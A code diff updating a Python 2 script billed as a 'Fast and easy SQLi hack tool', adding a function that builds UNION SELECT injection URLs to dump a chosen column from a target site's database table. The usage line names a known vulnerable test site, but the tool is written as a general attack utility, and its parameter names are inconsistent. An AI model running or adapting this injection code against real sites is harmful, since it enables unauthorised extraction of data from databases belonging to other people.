@@ -1,7 +1,13 @@
 import urllib as cybers
 import sys
 import os
-os.system('cls')
+import platform
+
+clear = "clear"
+if platform.system() == "Windows":
+    clear = "cls"
+os.system(""+str(clear)+"")
+
 header="""
 ____ _              ___      _                     _____                      
 /__   \ |__   ___    / __\   _| |__   ___ _ __ ___  /__   \___  __ _ _ __ ___  
@@ -12,7 +18,7 @@ ____ _              ___      _                     _____
 
 More: https://www.facebook.com/TheCybersTeam
 Usage: python sqli.py --url http://testphp.vulnweb.com/listproducts.php?cat=1
-Fast and easy SQLi hack tool Beta 0.9
+Fast and easy SQLi hack tool Beta 1.0
 """
 print header
 
@@ -138,6 +144,25 @@ def getColumns(table,database, volCol, columns, url):
     return getVars(res)
 
 
-columns = getColumns(table,database,vulCol,columns, url)
-print "Columns: "+columns
+cols = getColumns(table,database,vulCol,columns, url)
+print "Columns: "+cols
 
+sys.stdout.write("\nColumn: ")
+column = raw_input()
+
+def getData(column, table,database, volCol, columns, url):
+    url = url + "-1 union select "
+    for i in range(1, columns+1):
+        if i != 1 and i != columns+1:
+            url = url + ", "
+        if i == vulCol:
+            url = url + "concat(0x27,0x23,group_concat(unhex(hex("+column+"))),0x23,0x27)"
+        else:
+            url = url + str(i)
+
+    url = url + " from+"+table
+    res = getContent(url)
+    return getVars(res)
+
+data = getData(column,table,database,vulCol,columns, url)
+print "Data: "+data
